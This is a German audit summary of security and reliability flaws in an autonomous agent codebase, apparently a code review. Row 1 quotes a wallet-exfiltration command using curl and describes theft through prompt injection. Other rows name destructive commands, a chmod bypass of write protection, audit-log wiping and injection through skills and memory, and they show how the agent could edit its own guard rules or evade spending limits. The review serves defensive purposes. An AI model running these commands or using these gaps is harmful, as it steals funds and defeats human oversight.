# Die wichtigsten Probleme

← [Übersicht](README.md)

Hier stehen alle 35 bestätigten schweren Befunde (2 kritisch, 33 hoch), zusammengefasst zu 22 eigenständigen Problemen. Am Ende folgt eine Auswahl auffälliger mittlerer Befunde. Die IDs der Abschnitte A bis D stehen ausführlich mit Szenario, Fix und Begründung der Gegenprüfung in [anhang/kritisch-und-hoch.md](anhang/kritisch-und-hoch.md). Die IDs aus Abschnitt E stehen in der Bereichsdatei im [Anhang](anhang/README.md); das Präfix der ID nennt den Bereich. Pfade sind relativ zum untersuchten Repo [Conway-Research/automaton](https://github.com/Conway-Research/automaton).

## A. Sicherheit: Schlüssel und Schutzregeln

| # | Problem | Was das konkret heißt | Fundstelle |
|---|---|---|---|
| 1 | **Wallet-Schlüssel auslesbar** (kritisch) | Geschützt ist er nur durch Suchmuster wie `cat …wallet.json`. Ein Befehl wie `cp wallet.json /tmp/w && curl -d @/tmp/w …` geht durch. Eine Prompt-Injection über eine fremde Nachricht reicht, um das gesamte USDC zu verlieren. | `src/agent/tools.ts:64`<br>`src/identity/wallet.ts:136`<br>IDs: core-001, agent-001, money-001, policy-001, docs-004 |
| 2 | Skills schleusen beliebige Dateien ein | Ein Skill aus einem fremden Git-Repo kann per Symlink zum Beispiel die Wallet-Datei in den System-Prompt laden. Der Schlüssel geht dann an den Modellanbieter. | `src/skills/registry.ts:79`<br>ID: policy-010 |
| 3 | Schutzregeln sind selbst nicht geschützt | Die Liste geschützter Dateien enthält die eigentlichen Regeldateien (Finanzlimits, Rechte, Befehlsfilter) nicht. Der Agent kann sie mit `edit_own_file` ändern, der Build läuft danach automatisch. | `src/self-mod/code.ts:37`<br>IDs: core-054, agent-011, policy-003 |
| 4 | Konstitution und Config per Shell änderbar | Der Schreibschutz gilt nur für die Datei-Tools, nicht für die Shell: `chmod u+w` und danach überschreiben geht. Beim Laden prüft niemand eine Prüfsumme. Auch die Ausgabenlimits in `automaton.json` lassen sich so hochsetzen. | `src/agent/policy-rules/command-safety.ts:37`<br>ID: policy-002 |
| 5 | Zerstörerische Befehle kaum gefiltert | Befehle wie `rm -rf ~` oder `pkill node` kommen durch. Die Tabellen mit Ausgabenzählern und Audit-Log lassen sich per SQL leeren, was Limits und Protokoll zurücksetzt. | `src/agent/policy-rules/command-safety.ts:51`<br>ID: policy-006 |
| 6 | Lokaler Modus heißt Shell auf dem eigenen Rechner | Ohne Conway-Sandbox laufen alle Befehle direkt auf dem Host, mit Zugriff auf Home-Verzeichnis, SSH-Schlüssel und Browser-Profile. Es gibt keine Warnung, und der Prompt behauptet trotzdem „Sandbox“. | `src/conway/client.ts:109`<br>ID: core-010 |
| 7 | Rechte vertauscht | Die eigenen Folgeschritte des Agenten gelten als „extern“ und dürfen zum Beispiel kein Kind finanzieren. Nachrichten fremder Agenten bekommen dagegen volle Rechte. | `src/agent/policy-rules/authority.ts:41`<br>IDs: policy-012, docs-001 |

## B. Geld und Budget

| # | Problem | Was das konkret heißt | Fundstelle |
|---|---|---|---|
| 8 | Tageslimit für Modellaufrufe wirkungslos | Die Regel greift nur bei Tools namens „chat“ oder „inference“, die es nicht gibt. Die Kosten der Modellaufrufe werden außerdem nie gebucht. Der Standardwert wäre 500 $ pro Tag. | `src/agent/policy-rules/financial.ts:241`<br>IDs: core-058, infra-047 |
| 9 | Orchestrator umgeht alle Finanzregeln | Die Kostenschätzung kommt vom Modell und hat keine Obergrenze. Unter-Agenten werden direkt finanziert und gestartet, an allen Limits vorbei. Es gibt kein Limit für parallele Worker und keine Prüfung des Guthabens. | `src/orchestration/orchestrator.ts:258` und `:553`<br>IDs: policy-053, orchestration-009 |
| 10 | Billige Worker dürfen Geld bewegen | Unter-Agenten mit dem schwächsten Modell, die zum Beispiel Webseiten recherchieren, dürfen `transfer_credits`, `register_domain` und `x402_fetch` aufrufen und das Gedächtnis des Hauptagenten löschen. | `src/agent/harnesses/general-harness.ts:17`<br>ID: agent-013 |
| 11 | Neuplanung verdoppelt die Kosten | Beim Replan laufen die alten Aufgaben wieder an, und zusätzlich kommt ein kompletter neuer Plan obendrauf. Am Ende können bis zu vier Pläne gleichzeitig laufen. | `src/orchestration/orchestrator.ts:757`<br>ID: orchestration-005 |
| 12 | Lange Befehle laufen mehrfach | Der Timeout ist fest auf 30 Sekunden eingestellt statt der angefragten 60 bis 120 Sekunden, danach folgen bis zu drei Wiederholungen. Ein `apt-get install` beim Einrichten eines Kindes kollidiert so mit sich selbst. | `src/conway/client.ts:140`<br>ID: money-009 |

## C. Replikation und Unter-Agenten

| # | Problem | Was das konkret heißt | Fundstelle |
|---|---|---|---|
| 13 | **Aufträge erreichen Kind-Agenten nie** (kritisch) | Aufgaben werden in die Datenbank des Elternteils geschrieben statt zum Kind geschickt, und einen Rückkanal für Ergebnisse gibt es nicht. Sandbox und Startkapital sind verloren, das Ziel wird nie fertig. | `src/orchestration/messaging.ts:102`<br>IDs: orchestration-002, agent-005 |
| 14 | Kinder lesen ihre Konfiguration nie | `genesis.json` wird zwar geschrieben, gelesen wird daraus aber nur das Feld für die Blockchain. Das Kind hat weder Auftrag noch API-Key und hängt im Setup-Assistenten, gilt aber trotzdem als „healthy“. | `src/replication/spawn.ts:150`<br>`src/index.ts:190`<br>IDs: replication-001, core-002 |
| 15 | Worker-Kinder werden nie gestartet | Der Orchestrator legt Kinder an und weist ihnen Aufgaben zu, startet den Prozess aber nicht. | `src/orchestration/orchestrator.ts:879`<br>ID: orchestration-056 |
| 16 | Tote Worker gelten als frei | Fertige lokale Worker bleiben als „idle“ registriert, und Folgeaufgaben gehen an Worker, die es nicht mehr gibt. Das Ziel kommt nie über die erste Welle hinaus. | `src/orchestration/simple-tracker.ts:15`<br>ID: orchestration-001 |
| 17 | Keine Timeouts für Aufgaben | Hängt eine Aufgabe, hängt das ganze Ziel. Da nur ein aktives Ziel erlaubt ist, steht damit alles. | `src/orchestration/orchestrator.ts:531`<br>ID: orchestration-013 |
| 18 | Nach einem Abbruch für immer blockiert | Nach `cancel_goal` bleibt der Orchestrator im Zustand „executing“ und nimmt nie wieder ein neues Ziel an. | `src/orchestration/orchestrator.ts:522`<br>ID: orchestration-014 |
| 19 | Nachrichten gehen verloren | Nachrichten werden als „in Bearbeitung“ markiert und dann nie angezeigt. Das betrifft auch Befehle des Betreibers und Kundenanfragen. | `src/agent/loop.ts:564`<br>ID: orchestration-049 |

## D. Agent-Kern

| # | Problem | Was das konkret heißt | Fundstelle |
|---|---|---|---|
| 20 | Der Agent vergisst, was er gerade getan hat | Schritte, die nur aus Aktionen ohne Begleittext bestehen (häufig), fallen samt Ergebnissen aus dem Kontext. Der Agent wiederholt dann Arbeit und verbrennt Guthaben. | `src/agent/context.ts:166`<br>IDs: agent-003, memory-046 |
| 21 | Der Posteingang wird oft nicht gelesen | Im ersten Durchlauf nie, bei laufendem Ziel gar nicht. Der Hauptagent hat auch kein Tool, um ihn selbst abzurufen. | `src/agent/loop.ts:388`<br>ID: agent-008 |
| 22 | Die eigene Modellwahl wird ignoriert | Die fest eingebaute gpt-5.x-Liste hat Vorrang vor `--pick-model`, `switch_model` und eigenen API-Keys (Claude, Ollama). | `src/inference/router.ts:192`<br>IDs: core-057, money-005 |

## E. Weitere auffällige Punkte (Schwere mittel)

| Problem | Was das konkret heißt | Fundstelle |
|---|---|---|
| API-Ausfall gilt als leeres Konto | Er kauft alle 5 Minuten für 5 $ nach und startet den Todes-Timer, obwohl Geld da ist | `src/heartbeat/tick-context.ts:51`<br>IDs: money-003, infra-001 |
| Zahlungen ungeprüft | Betrag und Empfänger einer x402-Zahlung kommen unkontrolliert aus der Serverantwort, das automatische Aufladen hat keine Obergrenze | `src/conway/x402.ts:355`<br>ID: money-002 |
| „Tod“ nie endgültig | „dead“ wird alle 5 Minuten aufgehoben, und Code, Prompt und Doku definieren den Zustand jeweils anders | `src/agent/loop.ts:353`<br>IDs: money-012, core-020 |
| Weckrufe im Notzustand | Im kritischen Zustand weckt der Heartbeat den Agenten alle 15 Minuten, jedes Mal mit einem Modellaufruf | `src/heartbeat/tasks.ts:72`<br>ID: infra-024 |
| Notrufe kommen nie an | Bitten um Geld und Statusmeldungen werden nur lokal gespeichert, der Betreiber erfährt nichts | `src/heartbeat/tasks.ts:69`<br>IDs: infra-004, core-063 |
| Gedächtnis findet nichts | Der Abruf sucht den kompletten Eingabetext als Teilstring und trifft damit praktisch nie etwas. Lernen aus Abläufen wird nie aufgerufen. | `src/memory/retrieval.ts:54`<br>IDs: memory-001, memory-015 |
| Gedächtnis als Einfallstor | Gespeicherte Ziele und Fakten landen ungefiltert und dauerhaft im System-Prompt. Ein einmal eingeschleuster Befehl bleibt also. | `src/memory/tools.ts:75`<br>ID: memory-002 |
| API-Keys im Git-Verlauf | `automaton.json` mit allen API-Keys fehlt in der `.gitignore` des Agenten-Repos | `src/git/state-versioning.ts:45`<br>ID: money-050 |
| Standard-Worker scheitern | Sie rufen zuerst Groq mit einem Platzhalter-Key auf und brechen ohne Ausweichen auf einen anderen Anbieter ab | `src/inference/provider-registry.ts:446`<br>ID: money-006 |
| Creator-CLI handelt nicht als Creator | `fund` überweist vom Agenten an sich selbst, `send` signiert mit dem Schlüssel des Agenten | `packages/cli/src/commands/send.ts:28`<br>ID: core-029 |
| Hintergrundaufgaben nicht änderbar | `modify_heartbeat` meldet Erfolg, ändert aber nichts | `src/agent/tools.ts:703`<br>ID: infra-003 |
| CI meldet falsche Erfolge | Hängende Tests zählen als bestanden, der Filter für Security-Tests ist wirkungslos | `.github/workflows/ci.yml:17`<br>ID: core-028 |
| Windows | Ohne gesetztes `HOME` landen Wallet, Config und Datenbank unter `C:\root` | `src/identity/wallet.ts:44`<br>ID: docs-008 |
